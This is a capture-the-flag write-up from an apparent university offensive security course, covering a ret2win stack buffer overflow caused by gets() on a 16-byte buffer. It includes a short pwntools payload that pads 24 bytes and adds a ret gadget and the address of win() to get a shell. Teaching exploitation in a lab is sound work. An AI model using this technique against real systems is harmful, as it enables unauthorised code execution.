# Whispering Wall

**Category:** pwn / stack buffer overflow (ret2win) · **Course:** Offensive Security (PoliTo)

## Challenge

The smallest overflow in the set: a 16-byte `whisper` buffer read with unbounded `gets()`, plus a `win()` that pops a shell but is never called normally.

## Vulnerability

`gets(whisper)` on `char whisper[16]` with no canary in this build — straight overwrite of the saved return address after only 24 bytes of padding.

## Exploitation

1. Pad 24 bytes to the saved return address.
2. Insert a single `ret` gadget first for 16-byte stack alignment, then the address of `win()`.

As in `solve.py`:

```python
offset_rip = 24
ret_align  = 0x000000000040101a    # bare `ret`, for 16-byte stack alignment
win        = elf.sym.win

payload = flat(
    b"A" * offset_rip,
    p64(ret_align),
    p64(win),
)
```

## Files

- `main.c` — challenge source
- `whispering_wall` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
